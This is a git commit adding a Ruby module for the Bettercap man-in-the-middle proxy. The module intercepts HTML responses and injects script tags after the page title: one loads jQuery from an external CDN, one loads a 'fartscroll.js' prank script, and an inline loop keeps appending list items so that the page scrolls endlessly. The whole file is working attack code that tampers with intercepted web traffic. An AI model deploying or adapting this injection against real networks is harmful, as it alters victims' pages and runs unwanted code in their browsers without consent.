3c75255d0dbb865310f85b30d6f30de619dd2150
Robbie <txt3rob@gmail.com>
2015-07-27 16:37:51 +0100

    Update and rename replaceimage.rb to fartscroll.rb

---
+++ fartscroll.rb
@@ -0,0 +1,33 @@
+=begin
+
+BETTERCAP
+
+Author : Simone 'evilsocket' Margaritelli
+Email  : evilsocket@gmail.com
+Blog   : http://www.evilsocket.net/
+
+This project is released under the GPL 3 license.
+
+=end
+class HackTitle < Proxy::Module
+  def on_request( request, response )
+    # is it a html page?
+    if response.content_type =~ /^text\/html.*/
+      Logger.info "Hacking http://#{request.host}#{request.url} title tag"
+      # make sure to use sub! or gsub! to update the instance
+      response.body.sub!( '</title>', '</title><script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+        <script src="fartscroll.js"></script>
+        <script>
+        $(document).ready(function() {
+            // Ensure the page always has more scrolling
+            $(document).scroll(function() {
+                while ((window.pageYOffset + window.innerHeight) >= $(this).height() - (window.innerHeight / 2)) {
+                    $('ul').append('<li>Testing.</li>');
+                }
+            }).scroll();
+            fartscroll(800);
+        });
+        </script> ' )
+    end
+  end
+end
